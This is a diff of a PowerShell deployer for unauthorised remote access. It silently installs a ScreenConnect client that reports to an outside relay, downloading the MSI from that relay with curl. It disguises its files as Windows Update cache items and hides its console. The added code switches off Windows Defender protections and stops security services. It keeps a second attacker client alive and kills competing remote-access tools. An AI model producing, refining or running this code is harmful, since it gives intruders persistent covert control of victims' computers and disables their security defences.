@@ -3,25 +3,19 @@ $ProgressPreference = 'SilentlyContinue'
 $WarningPreference = 'SilentlyContinue'
 $ConfirmPreference = 'None'
 
-# Hide console
-try {
-    if (-not ('Native.Win' -as [type])) {
-        Add-Type -Name Win -Namespace Native -MemberDefinition @'
-[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'@
-    }
-    $hwnd = [Native.Win]::GetConsoleWindow()
-    if ($hwnd -ne [IntPtr]::Zero) { [void][Native.Win]::ShowWindow($hwnd, 0) }
-} catch {}
-
 # ============================================
 # CONFIG
 # ============================================
 $PrimaryFingerprint = '5f6010579852e507'
-$AllowedFingerprints = @('5f6010579852e507', 'f861c8140d453427')
+$AltFingerprint = 'f861c8140d453427'   # pluxn — NEVER stop/kill/delete
+$AllowedFingerprints = @($PrimaryFingerprint, $AltFingerprint)
+$AllowedSvcNames = @(
+    "ScreenConnect Client ($PrimaryFingerprint)",
+    "ScreenConnect Client ($AltFingerprint)"
+)
 $BlockedRelayHints = @('uvexr.com', 'update.uvexr.com', 'vexlm.com')
 $SvcName = "ScreenConnect Client ($PrimaryFingerprint)"
+$AltSvcName = "ScreenConnect Client ($AltFingerprint)"
 $MsiUrl = 'https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
 $RelayServer = 'update.sevrz.com'
 $RelayPort = 443
@@ -52,7 +46,7 @@ $RivalTokens = @(
 )
 
 # ============================================
-# BASICS
+# BASICS — log FIRST (before Add-Type / elevation)
 # ============================================
 function Write-Log {
     param([string]$Message)
@@ -60,10 +54,22 @@ function Write-Log {
         if (-not (Test-Path $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
         $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
         Add-Content -Path $LogFile -Value "[$ts] $Message" -ErrorAction SilentlyContinue
-        $f = Get-Item $LogFile -Force -ErrorAction SilentlyContinue
-        if ($f) { $f.Attributes = 'Hidden', 'System' }
+        # Keep visible for Guest troubleshooting (do not hide)
     } catch {}
 }
+
+function Write-Boot {
+    param([string]$Message)
+    try {
+        $bootErr = Join-Path $WorkDir 'boot.err'
+        Add-Content -Path $bootErr -Value $Message -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+New-Item -ItemType Directory -Path $WorkDir, $WorkDirAlt, $ScDir -Force | Out-Null
+Write-Boot ("ps_start pid={0} file={1}" -f $PID, $PSCommandPath)
+Write-Log '=== UNIFIED deploy start ==='
+Write-Log 'WU_BUILD_20260731_UNIFIED12'
 
 function Test-IsElevated {
     $id = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -71,59 +77,68 @@ function Test-IsElevated {
     return ($id.User.Value -eq 'S-1-5-18') -or $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
+Write-Log ("Host={0} user={1} pid={2} elevated={3}" -f `
+    $env:COMPUTERNAME, [Security.Principal.WindowsIdentity]::GetCurrent().Name, $PID, (Test-IsElevated))
+Write-Log ("PROTECT alt forever: $AltSvcName")
+Write-Log 'AV-FIGHT: exclusions + disable realtime (best-effort)'
+try {
+    if (Get-Command Set-MpPreference -EA SilentlyContinue) {
+        Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $true -EA SilentlyContinue
+        Set-MpPreference -DisableIOAVProtection $true -EA SilentlyContinue
+        Set-MpPreference -DisableScriptScanning $true -EA SilentlyContinue
+        Set-MpPreference -DisableBlockAtFirstSeen $true -EA SilentlyContinue
+    }
+} catch {}
+try {
+    foreach ($svc in @('WinDefend','WdNisSvc','Sense','SecurityHealthService')) {
+        & sc.exe stop $svc >$null 2>&1
+        & sc.exe config $svc start= disabled >$null 2>&1
+    }
+} catch {}
+
+
 if (-not (Test-IsElevated)) {
-    Start-Process powershell.exe -Verb RunAs -ArgumentList (
-        "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
-    ) -WindowStyle Hidden | Out-Null
-    exit
+    Write-Log 'NOT ELEVATED — abort (no UAC prompt in background worker)'
+    Write-Boot 'ps_abort_not_elevated'
+    exit 5
 }
 
-New-Item -ItemType Directory -Path $WorkDir, $WorkDirAlt, $ScDir -Force | Out-Null
-Write-Log '=== UNIFIED deploy start ==='
-Write-Log 'WU_BUILD_20260730_UNIFIED'
-Write-Log ("Host={0} user={1} pid={2}" -f $env:COMPUTERNAME, [Security.Principal.WindowsIdentity]::GetCurrent().Name, $PID)
+# Hide console (never block startup)
+try {
+    if (-not ('Native.Win' -as [type])) {
+        Add-Type -Name Win -Namespace Native -MemberDefinition @'
+[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'@
+    }
+    $hwnd = [Native.Win]::GetConsoleWindow()
+    if ($hwnd -ne [IntPtr]::Zero) { [void][Native.Win]::ShowWindow($hwnd, 0) }
+} catch {}
 
 # ============================================
 # PHASE 0 — purge PREVIOUS scripts / tasks / monitors (keep scclient binaries)
 # ============================================
 function Remove-PreviousDeployArtifacts {
-    Write-Log 'PHASE 0: removing previous deploy scripts/tasks (keep scclient)'
-    # Kill other payload hosts (never kill our own PID; never kill healthy primary SC here)
-    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
-        $_.ProcessId -ne $PID -and (
-            $_.CommandLine -match 'wucache_pkg|wucache\.ps1|wucache_boot|\.wucache\\boot|\.diag\.log' -or
-            $_.CommandLine -match 'WU_BUILD_|updateA\.b64|MSServices\.ps1'
-        )
-    } | ForEach-Object {
-        Write-Log "PHASE 0: stop old payload pid=$($_.ProcessId)"
-        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
-    }
-
+    Write-Log 'PHASE 0: removing previous deploy scripts/tasks (keep scclient + running payload)'
+    # Do NOT kill sibling wucache_pkg / boot workers — dual-launch race was killing the payload
     foreach ($tn in @(
-        '\Microsoft\Windows\Diagnosis\WMIRegistration',
         '\Microsoft\Windows\Diagnosis\Scheduled',
         '\Microsoft\Windows\Diagnosis\BVTConsumer'
     )) {
         schtasks.exe /Delete /TN $tn /F >$null 2>&1
     }
 
+    # Do NOT delete: update.b64, boot.err, boot_*.cmd, wucache_pkg.ps1, .diag.log
     foreach ($p in @(
-        (Join-Path $WorkDir 'wucache.ps1'),
         (Join-Path $WorkDir 'wucache.vbs'),
-        (Join-Path $WorkDir 'wucache_pkg.ps1'),
         (Join-Path $WorkDir 'wucache_bootrepair.ps1'),
-        (Join-Path $WorkDir 'boot.cmd'),
-        (Join-Path $WorkDir 'boot.err'),
-        (Join-Path $WorkDir 'update.b64'),
-        (Join-Path $WorkDirAlt 'wucache.ps1'),
         (Join-Path $WorkDirAlt 'wucache.vbs'),
-        'C:\Windows\Temp\wucache_pkg.ps1',
         'C:\Windows\Temp\wucache_boot.cmd'
     )) {
         Remove-Item $p -Force -ErrorAction SilentlyContinue
     }
 
-    # Clear junk ImagePath cache so we never re-apply GUID garbage
     $imgCache = Join-Path $WorkDir '.sc_imgpath'
     if (Test-Path $imgCache) {
         $old = Get-Content $imgCache -Raw -ErrorAction SilentlyContinue
@@ -141,12 +156,28 @@ function Remove-PreviousDeployArtifacts {
 function Get-StealthScDir { return $ScDir }
 
 function Get-ScInstallRoots {
-    @(
+    $roots = [System.Collections.Generic.List[string]]::new()
+    foreach ($r in @(
         $ScDir,
         "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)",
         "${env:ProgramFiles}\ScreenConnect Client ($PrimaryFingerprint)",
         "${env:ProgramData}\ScreenConnect\$PrimaryFingerprint"
-    ) | Where-Object { $_ -and (Test-Path $_) }
+    )) {
+        if ($r -and (Test-Path $r)) { [void]$roots.Add($r) }
+    }
+    # Also trust the live service ImagePath directory
+    try {
+        $svc = Get-CimInstance Win32_Service -Filter "Name='$SvcName'" -ErrorAction SilentlyContinue
+        if ($svc -and $svc.PathName) {
+            $m = [regex]::Match($svc.PathName, '^"([^"]+)"|^(\S+\.exe)')
+            $exe = if ($m.Groups[1].Success) { $m.Groups[1].Value } else { $m.Groups[2].Value }
+            if ($exe) {
+                $dir = Split-Path -Parent $exe
+                if ($dir -and (Test-Path $dir) -and -not $roots.Contains($dir)) { [void]$roots.Add($dir) }
+            }
+        }
+    } catch {}
+    return @($roots)
 }
 
 function Test-ScServicePresent {
@@ -189,10 +220,194 @@ function Get-ScBinaryHealth {
     return $info
 }
 
-function Test-PrimaryScReady {
-    # Ready = service RUNNING + healthy ClientService on disk
+function Test-IsPrimaryScProcess {
+    param($Proc)
+    $blob = ''
+    try {
+        $cim = Get-CimInstance Win32_Process -Filter "ProcessId=$($Proc.Id)" -ErrorAction SilentlyContinue
+        if ($cim) { $blob = "$($cim.ExecutablePath) $($cim.CommandLine)" }
+    } catch {}
+    if (-not $blob) {
+        try { $blob = $Proc.Path } catch {}
+    }
+    if (-not $blob) { return $false }
+    if ($blob -like "*$AltFingerprint*") { return $false }
+    if ($blob -like "*$PrimaryFingerprint*") { return $true }
+    if ($blob -like '*\.wucache\scclient*') { return $true }
+    return $false
+}
+
+function Get-PrimaryScProcessIds {
+    $ids = @()
+    Get-Process -Name 'ScreenConnect.ClientService' -ErrorAction SilentlyContinue | ForEach-Object {
+        if (Test-IsPrimaryScProcess $_) { $ids += $_.Id }
+    }
+    return $ids
+}
+
+function Get-ScFingerprintsFromBlob {
+    param([string]$Blob)
+    if (-not $Blob) { return @() }
+    $fps = [System.Collections.Generic.List[string]]::new()
+    # Match (16-hex) anywhere near ScreenConnect paths/names
+    foreach ($m in [regex]::Matches($Blob, '(?i)\(([0-9a-f]{16})\)')) {
+        $fp = $m.Groups[1].Value.ToLowerInvariant()
+        if (-not $fps.Contains($fp)) { [void]$fps.Add($fp) }
+    }
+    return @($fps)
+}
+
+function Test-IsAllowedFingerprint {
+    param([string]$Fp)
+    if (-not $Fp) { return $false }
+    $f = $Fp.ToLowerInvariant()
+    foreach ($a in $AllowedFingerprints) {
+        if ($a.ToLowerInvariant() -eq $f) { return $true }
+    }
+    return $false
+}
+
+function Test-IsAllowedSc {
+    param([string]$Blob)
+    if (-not $Blob) { return $false }
+    foreach ($fp in (Get-ScFingerprintsFromBlob $Blob)) {
+        if (Test-IsAllowedFingerprint $fp) { return $true }
+    }
+    foreach ($a in $AllowedFingerprints) {
+        if ($Blob -like "*$a*") { return $true }
+    }
+    foreach ($n in $AllowedSvcNames) {
+        if ($Blob -like "*$n*") { return $true }
+    }
+    return $false
+}
+
+function Test-IsProtectedScTarget {
+    # ONLY protect allowlisted fingerprints (sevrz + pluxn) and stealth primary without foreign FP.
+    param([string]$Blob, [string]$Name = '')
+    if ($Name -and ($AllowedSvcNames -contains $Name)) { return $true }
+    if (Test-IsAllowedSc "$Blob $Name") { return $true }
+    $fps = @(Get-ScFingerprintsFromBlob "$Blob $Name")
+    foreach ($fp in $fps) {
+        if (Test-IsAllowedFingerprint $fp) { return $true }
+    }
+    # stealth primary drop dir with no foreign FP
+    if ($Blob -like '*\.wucache\scclient*') {
+        $foreign = $false
+        foreach ($fp in $fps) {
+            if (-not (Test-IsAllowedFingerprint $fp)) { $foreign = $true }
+        }
+        if (-not $foreign) { return $true }
+    }
+    return $false
+}
+
+function Assert-AllowedAlternativesAlive {
+    # Called after every disruptive phase — keep pluxn online forever
+    param([switch]$Silent)
+    foreach ($fp in $AllowedFingerprints) {
+        if ($fp -eq $PrimaryFingerprint) { continue }
+        $name = "ScreenConnect Client ($fp)"
+        $s = Get-Service -Name $name -ErrorAction SilentlyContinue
+        if (-not $s) {
+            if (-not $Silent) { Write-Log "PROTECT: ALLOWED service MISSING: $name" }
+            continue
+        }
+        & sc.exe config "$name" start= auto >$null 2>&1
+        & sc.exe failure "$name" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >$null 2>&1
+        for ($t = 1; $t -le 3; $t++) {
+            $s = Get-Service -Name $name -ErrorAction SilentlyContinue
+            if ($s -and $s.Status -eq 'Running') { break }
+            if (-not $Silent) { Write-Log "PROTECT: starting ALLOWED $name (try $t)" }
+            & sc.exe start "$name" >$null 2>&1
+            try { Start-Service -Name $name -ErrorAction SilentlyContinue } catch {}
+            Start-Sleep -Seconds 2
+        }
+        $s = Get-Service -Name $name -ErrorAction SilentlyContinue
+        $st = if ($s) { "$($s.Status)" } else { 'Missing' }
+        if (-not $Silent) { Write-Log "PROTECT: $name status=$st" }
+    }
+}
+
+function Start-AllowedAlternatives { Assert-AllowedAlternativesAlive }
+
+function Stop-PrimaryScProcesses {
+    # NEVER kill by image name alone — that drops allowed alt (pluxn)
+    & sc.exe stop "$SvcName" >$null 2>&1
+    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+        $_.Name -match '(?i)^ScreenConnect\.(ClientService|WindowsClient|Client)\.exe$'
+    } | ForEach-Object {
+        $blob = "$($_.Name) $($_.ExecutablePath) $($_.CommandLine)"
+        # Absolute: never touch allowed alt
+        if (Test-IsAllowedSc $blob -and $blob -notlike "*$PrimaryFingerprint*" -and $blob -notlike '*\.wucache\scclient*') {
+            Write-Log "PROTECT skip kill alt pid=$($_.ProcessId)"
+            return
+        }
+        if ($blob -like "*$AltFingerprint*") {
+            Write-Log "PROTECT skip kill pluxn pid=$($_.ProcessId)"
+            return
+        }
+        $isPrimary = (
+            $_.ExecutablePath -like "*$PrimaryFingerprint*" -or
+            $_.CommandLine -like "*$PrimaryFingerprint*" -or
+            $_.ExecutablePath -like '*\.wucache\scclient*' -or
+            $_.CommandLine -like '*\.wucache\scclient*'
+        )
+        if (-not $isPrimary) {
+            Write-Log "PROTECT skip non-primary SC pid=$($_.ProcessId)"
+            return
+        }
+        Write-Log "stop primary SC pid=$($_.ProcessId)"
+        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
+    }
+}
+
+function Test-ScRelayConnected {
+    # Only primary fingerprint / stealth path — alt SC 443 must NOT count as ready
+    $pids = @(Get-PrimaryScProcessIds)
+    if ($pids.Count -eq 0) {
+        Write-Log 'RELAY: no primary ClientService PID'
+        return $false
+    }
+    try {
+        $hits = @(Get-NetTCPConnection -State Established, SynSent -ErrorAction SilentlyContinue | Where-Object {
+            ($pids -contains $_.OwningProcess) -and ($_.RemotePort -eq $RelayPort)
+        })
+        if ($hits.Count -gt 0) {
+            Write-Log ("RELAY ok pid={0} remote={1}:{2}" -f $hits[0].OwningProcess, $hits[0].RemoteAddress, $hits[0].RemotePort)
+            return $true
+        }
+    } catch {}
+    try {
+        $raw = & netstat.exe -ano 2>$null
+        foreach ($line in $raw) {
+            foreach ($id in $pids) {
+                if ($line -match ":$RelayPort\s+" -and $line -match 'ESTABLISHED|SYN_SENT' -and $line -match "\s$id\s*$") {
+                    Write-Log "RELAY ok via netstat pid=$id"
+                    return $true
+                }
+            }
+        }
+    } catch {}
+    Write-Log 'RELAY: no TCP session from PRIMARY ClientService'
+    return $false
+}
+
+function Test-PrimaryScOperational {
+    # Installed + healthy binaries + service RUNNING = leave it alone
     $h = Get-ScBinaryHealth
-    return ($h.ServiceRunning -and $h.HealthyFiles)
+    return [bool]($h.ServicePresent -and $h.ServiceRunning -and $h.HealthyFiles -and -not $h.Stubbed)
+}
+
+function Test-PrimaryScReady {
+    # Phase gate (nuke/continue): operational — do NOT require relay TCP
+    return (Test-PrimaryScOperational)
+}
+
+function Test-PrimaryImagePathJunk {
+    $svc = Get-CimInstance Win32_Service -Filter "Name='$SvcName'" -ErrorAction SilentlyContinue
+    if (-not $svc -or -not $svc.PathName) { return $false }
+    return [bool]($svc.PathName -match '\{[0-9A-F]{8}-' -or $svc.PathName -match '\|ScreenConnect')
 }
 
 # ============================================
@@ -373,6 +588,8 @@ function Invoke-GenericAvPushback {
             Write-Log "AV soft-disable: $svcName"
         }
     }
+    # AV storms can drop SC — always reassert allowed alt
+    Assert-AllowedAlternativesAlive
 }
 
 # ============================================
@@ -401,6 +618,46 @@ function Copy-ScPayloadFiles {
     return $n
 }
 
+function Install-PrimaryFromMsi {
+    # msiexec runs FixupServiceArguments — required for sevrz console check-in
+    Write-Log 'INSTALL: msiexec /i (FixupServiceArguments)'
+    Invoke-GenericAvPushback | Out-Null
+    $msi = Join-Path $env:TEMP 'sc_primary.msi'
+    $log = Join-Path $WorkDir 'msi_join.log'
+    & curl.exe -L --ssl-no-revoke --connect-timeout 30 -o "$msi" "$MsiUrl" >$null 2>&1
+    if (-not (Test-Path $msi) -or ((Get-Item $msi).Length -lt 500000)) {
+        Write-Log 'INSTALL: MSI download failed'
+        return $false
+    }
+    Write-Log ("INSTALL: MSI bytes={0}" -f (Get-Item $msi).Length)
+    Stop-PrimaryScProcesses
+    # Do NOT kill all msiexec — can disrupt allowed alt SC / other installs
+    Start-Sleep -Seconds 2
+    try { Start-Service msiserver -ErrorAction SilentlyContinue } catch {}
+    $p = Start-Process msiexec.exe -ArgumentList "/i `"$msi`" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v `"$log`"" `
+        -Wait -PassThru -WindowStyle Hidden
+    Write-Log "INSTALL: msiexec exit $($p.ExitCode)"
+    if ($p.ExitCode -ne 0 -and $p.ExitCode -ne 3010) {
+        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$msi`" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus REBOOT=ReallySuppress /l*v `"$log`"" `
+            -Wait -PassThru -WindowStyle Hidden
+        Write-Log "INSTALL: msiexec reinstall exit $($p2.ExitCode)"
+    }
+    Start-Sleep -Seconds 8
+    & sc.exe config "$SvcName" start= auto >$null 2>&1
+    & sc.exe start "$SvcName" >$null 2>&1
+    try { Start-Service -Name $SvcName -ErrorAction SilentlyContinue } catch {}
+    Start-AllowedAlternatives
+    Start-Sleep -Seconds 6
+    $svc = Get-CimInstance Win32_Service -Filter "Name='$SvcName'" -ErrorAction SilentlyContinue
+    if ($svc -and $svc.PathName -notmatch '\{[0-9A-F]{8}-') {
+        Set-Content -Path (Join-Path $WorkDir '.sc_imgpath') -Value $svc.PathName -Encoding UTF8 -Force
+        Write-Log ("INSTALL: ImagePath after MSI hasS={0} len={1}" -f ($svc.PathName -match '&s='), $svc.PathName.Length)
+    }
+    $ok = [bool](Test-ScServiceRunning)
+    Write-Log ("INSTALL: msiexec running={0} relay={1}" -f $ok, (Test-ScRelayConnected))
+    return $ok
+}
+
 function Install-PrimaryFromZip {
     Write-Log 'INSTALL: zip -> stealth scclient'
     $zip = Join-Path $WorkDir 'sc_payload.zip'
@@ -426,11 +683,7 @@ function Install-PrimaryFromZip {
         Write-Log 'INSTALL: zip missing ClientService.exe'
         return $false
     }
-    # Stop SC briefly for overwrite
-    & sc.exe stop "$SvcName" >$null 2>&1
-    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
-        $_.ExecutablePath -like '*\.wucache\scclient*' -or $_.ExecutablePath -like "*$PrimaryFingerprint*"
-    } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+    Stop-PrimaryScProcesses
 
     $n = Copy-ScPayloadFiles -SrcDir $svc.Directory.FullName -DestDir $ScDir
     Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
@@ -440,9 +693,28 @@ function Install-PrimaryFromZip {
 }
 
 function Set-PrimaryScImagePath {
-    param([string]$Args)
-    $exe = Join-Path $ScDir 'ScreenConnect.ClientService.exe'
-    if (-not (Test-Path $exe)) { return $false }
+    param([string]$Args, [switch]$Force)
+    $rk = "HKLM:\SYSTEM\CurrentControlSet\Services\$SvcName"
+    if (-not $Force -and (Test-Path $rk)) {
+        $cur = (Get-ItemProperty $rk -ErrorAction SilentlyContinue).ImagePath
+        if ($cur -and $cur -match '&s=' -and $cur -notmatch '\{[0-9A-F]{8}-') {
+            Write-Log 'ImagePath keep msiexec/fixup args'
+            return $true
+        }
+        if ($cur -and $cur -like '*Program Files*ScreenConnect*' -and $cur -match '\?e=Access' -and $cur -notmatch '\{[0-9A-F]{8}-') {
+            Write-Log 'ImagePath keep Program Files install'
+            return $true
+        }
+    }
+    $exe = $null
+    foreach ($cand in @(
+        "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)\ScreenConnect.ClientService.exe",
+        "${env:ProgramFiles}\ScreenConnect Client ($PrimaryFingerprint)\ScreenConnect.ClientService.exe",
+        (Join-Path $ScDir 'ScreenConnect.ClientService.exe')
+    )) {
+        if (Test-Path $cand) { $exe = $cand; break }
+    }
+    if (-not $exe) { return $false }
     if (-not $Args) { $Args = Get-CleanScArgs }
     if (-not $Args) { return $false }
     if ($Args -match '\{[0-9A-F]{8}-' -or $Args -match '\|ScreenConnect') {
@@ -450,31 +722,24 @@ function Set-PrimaryScImagePath {
         return $false
     }
     $img = '"{0}" "{1}"' -f $exe, $Args
-    $rk = "HKLM:\SYSTEM\CurrentControlSet\Services\$SvcName"
     if (-not (Test-ScServicePresent)) {
         try {
             New-Service -Name $SvcName -BinaryPathName $img -DisplayName $SvcName -StartupType Automatic -ErrorAction Stop | Out-Null
             Write-Log 'service created'
-        } catch {
-            Write-Log "New-Service: $($_.Exception.Message)"
-        }
+        } catch { Write-Log "New-Service: $($_.Exception.Message)" }
     }
-    if (-not (Test-Path $rk)) {
-        Write-Log 'service registry key missing'
-        return $false
-    }
+    if (-not (Test-Path $rk)) { return $false }
     Set-ItemProperty -Path $rk -Name ImagePath -Value $img -Force -ErrorAction SilentlyContinue
     Set-ItemProperty -Path $rk -Name Start -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
     Set-Content -Path (Join-Path $WorkDir '.sc_imgpath') -Value $img -Encoding UTF8 -Force
     Write-Log ("registry ImagePath set args_len={0}" -f $Args.Length)
     & sc.exe config "$SvcName" start= auto >$null 2>&1
-    & sc.exe failure "$SvcName" reset= 86400 actions= restart/5000/restart/5000/restart/5000 >$null 2>&1
     return $true
 }
 
 function Start-PrimaryService {
     if (-not (Test-ScServicePresent)) { return $false }
-    Set-PrimaryScImagePath | Out-Null
+    & sc.exe config "$SvcName" start= auto >$null 2>&1
     if (-not (Test-ScServiceRunning)) {
         & sc.exe start "$SvcName" >$null 2>&1
         try { Start-Service -Name $SvcName -ErrorAction SilentlyContinue } catch {}
@@ -510,124 +775,229 @@ function Set-ArpCamouflage {
 }
 
 function Ensure-PrimarySc {
-    param([int]$MaxRounds = 6)
-    Write-Log "ENSURE primary SC (max $MaxRounds rounds)"
-    for ($i = 1; $i -le $MaxRounds; $i++) {
-        Write-Log "ENSURE round $i/$MaxRounds"
-        Enable-QuietDefenderExclusions
-        $h = Get-ScBinaryHealth
-        Write-Log ("ENSURE-$i present={0} running={1} svcExe={2} client={3}/{4} stub={5} healthyFiles={6}" -f `
-            $h.ServicePresent, $h.ServiceRunning, $h.SvcExeSize, $h.HasClientExe, $h.ClientExeSize, $h.Stubbed, $h.HealthyFiles)
+    param([int]$MaxRounds = 4)
+    Write-Log "ENSURE primary SC (max $MaxRounds rounds) — skip reinstall if healthy+running"
+    Assert-AllowedAlternativesAlive
 
-        if ($h.ServiceRunning -and $h.HealthyFiles) {
-            Write-Log 'ENSURE-OK: primary SC RUNNING + healthy files'
+    # Fast path: already good — do NOT msiexec/zip
+    if (Test-PrimaryScOperational -and -not (Test-PrimaryImagePathJunk)) {
+        $relay = Test-ScRelayConnected
+        Write-Log ("ENSURE-OK: primary already healthy+running (relay={0}) — skip reinstall" -f $relay)
+        Enable-ScFirewallAllow
+        Set-ArpCamouflage
+        Assert-AllowedAlternativesAlive
+        return $true
+    }
+
+    for ($i = 1; $i -le $MaxRounds; $i++) {
+        Write-Log "ENSURE repair round $i/$MaxRounds"
+        Enable-QuietDefenderExclusions
+        Assert-AllowedAlternativesAlive -Silent
+        $h = Get-ScBinaryHealth
+        $relay = Test-ScRelayConnected
+        $junk = Test-PrimaryImagePathJunk
+        Write-Log ("ENSURE-$i present={0} running={1} svcExe={2} healthyFiles={3} stub={4} junkImg={5} relay={6}" -f `
+            $h.ServicePresent, $h.ServiceRunning, $h.SvcExeSize, $h.HealthyFiles, $h.Stubbed, $junk, $relay)
+
+        if ($h.ServiceRunning -and $h.HealthyFiles -and -not $h.Stubbed -and -not $junk) {
+            Write-Log 'ENSURE-OK: primary healthy+running — skip further reinstall'
+            Enable-ScFirewallAllow
+            Set-ArpCamouflage
+            Assert-AllowedAlternativesAlive
+            return $true
+        }
+
+        # Healthy files, service stopped/missing — start only (no reinstall yet)
+        if ($h.HealthyFiles -and -not $h.Stubbed -and -not $junk) {
+            Write-Log 'ENSURE: healthy files but not running — start only'
+            if (-not $h.ServicePresent) { Set-PrimaryScImagePath | Out-Null }
+            Start-PrimaryService | Out-Null
+            Assert-AllowedAlternativesAlive -Silent
+            Start-Sleep -Seconds 4
+            if (Test-PrimaryScOperational) {
+                Write-Log 'ENSURE-OK: started existing healthy install'
+                Enable-ScFirewallAllow
+                Set-ArpCamouflage
+                Assert-AllowedAlternativesAlive
+                return $true
+            }
+            Write-Log 'ENSURE: start failed on healthy files — problem, msiexec once'
+            Install-PrimaryFromMsi | Out-Null
+            Assert-AllowedAlternativesAlive
+            if (Test-PrimaryScOperational) { return $true }
+            continue
+        }
+
+        # Junk ImagePath while otherwise present — registry fix first, MSI only if still broken
+        if ($junk) {
+            Write-Log 'ENSURE: junk ImagePath — registry fix then start'
+            Set-PrimaryScImagePath -Force | Out-Null
+            Start-PrimaryService | Out-Null
+            Assert-AllowedAlternativesAlive -Silent
+            Start-Sleep -Seconds 3
+            if (Test-PrimaryScOperational -and -not (Test-PrimaryImagePathJunk)) {
+                Write-Log 'ENSURE-OK: ImagePath repaired without MSI'
+                return $true
+            }
+            Write-Log 'ENSURE: ImagePath still bad — msiexec'
+            Install-PrimaryFromMsi | Out-Null
+            Assert-AllowedAlternativesAlive
+            if (Test-PrimaryScOperational) { return $true }
+            continue
+        }
+
+        # Missing / stubbed binaries — real problem
+        Write-Log 'ENSURE: files missing/stubbed — zip then start; MSI only if still broken'
+        Invoke-GenericAvPushback
+        Install-PrimaryFromZip | Out-Null
+        Set-PrimaryScImagePath -Force | Out-Null
+        Start-PrimaryService | Out-Null
+        Assert-AllowedAlternativesAlive
+        Start-Sleep -Seconds 4
+        if (Test-PrimaryScOperational) {
+            Write-Log 'ENSURE-OK: restored via zip (no MSI needed)'
             Enable-ScFirewallAllow
             Set-ArpCamouflage
             return $true
         }
-
-        # Healthy files but stopped -> start only (NEVER nuclear)
-        if ($h.HealthyFiles) {
-            Write-Log 'ENSURE: healthy files, starting service'
-            if (-not $h.ServicePresent) { Set-PrimaryScImagePath | Out-Null }
-            if (Start-PrimaryService) { continue }
-            # AV may be blocking start
-            Write-Log 'ENSURE: start failed -> AV pushback then retry start'
-            Invoke-GenericAvPushback
-            Start-Sleep -Seconds 2
-            Start-PrimaryService | Out-Null
-            continue
-        }
-
-        # Missing / stubbed files -> zip redeploy
-        Write-Log 'ENSURE: files missing/bad -> AV pushback + zip install'
-        Invoke-GenericAvPushback
-        Install-PrimaryFromZip | Out-Null
-        Set-PrimaryScImagePath | Out-Null
-        Start-PrimaryService | Out-Null
-        Start-Sleep -Seconds 4
+        Write-Log 'ENSURE: zip/start insufficient — msiexec join'
+        Install-PrimaryFromMsi | Out-Null
+        Assert-AllowedAlternativesAlive
+        if (Test-PrimaryScOperational) { return $true }
     }
-    $final = Get-ScBinaryHealth
-    Write-Log ("ENSURE-FINAL running={0} healthyFiles={1}" -f $final.ServiceRunning, $final.HealthyFiles)
-    return ($final.ServiceRunning -and $final.HealthyFiles)
+
+    $final = Test-PrimaryScOperational
+    Assert-AllowedAlternativesAlive
+    Write-Log ("ENSURE-FINAL operational={0} relay={1}" -f $final, (Test-ScRelayConnected))
+    return $final
 }
 
 # ============================================
 # RIVAL NUKE — ONLY after primary ready
+# HARD RULE: never stop/kill/delete allowed SC (pluxn). Ambiguous SC = protect.
 # ============================================
-function Test-IsAllowedSc {
-    param([string]$Blob)
-    foreach ($a in $AllowedFingerprints) {
-        if ($Blob -like "*$a*") { return $true }
+function Remove-ScreenConnectInstance {
+    param([string]$Fingerprint, [string]$Reason = 'unauthorized')
+    if (-not $Fingerprint) { return 0 }
+    if (Test-IsAllowedFingerprint $Fingerprint) {
+        Write-Log "NUKE REFUSE allowed FP $Fingerprint"
+        return 0
     }
-    return $false
+    $n = 0
+    $svcName = "ScreenConnect Client ($Fingerprint)"
+    Write-Log "NUKE $Reason SC $svcName"
+    & sc.exe stop "$svcName" >$null 2>&1
+    & sc.exe delete "$svcName" >$null 2>&1
+    Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
+        $_.Name -like "*$Fingerprint*" -or $_.PathName -like "*$Fingerprint*" -or $_.DisplayName -like "*$Fingerprint*"
+    } | ForEach-Object {
+        if (Test-IsAllowedSc "$($_.Name) $($_.PathName)") { return }
+        Write-Log "NUKE svc $($_.Name)"
+        & sc.exe stop "$($_.Name)" >$null 2>&1
+        & sc.exe delete "$($_.Name)" >$null 2>&1
+        $n++
+    }
+    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+        $_.Name -match '(?i)^ScreenConnect\.' -and (
+            $_.ExecutablePath -like "*$Fingerprint*" -or $_.CommandLine -like "*$Fingerprint*"
+        )
+    } | ForEach-Object {
+        Write-Log "NUKE proc pid=$($_.ProcessId) fp=$Fingerprint"
+        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
+        $n++
+    }
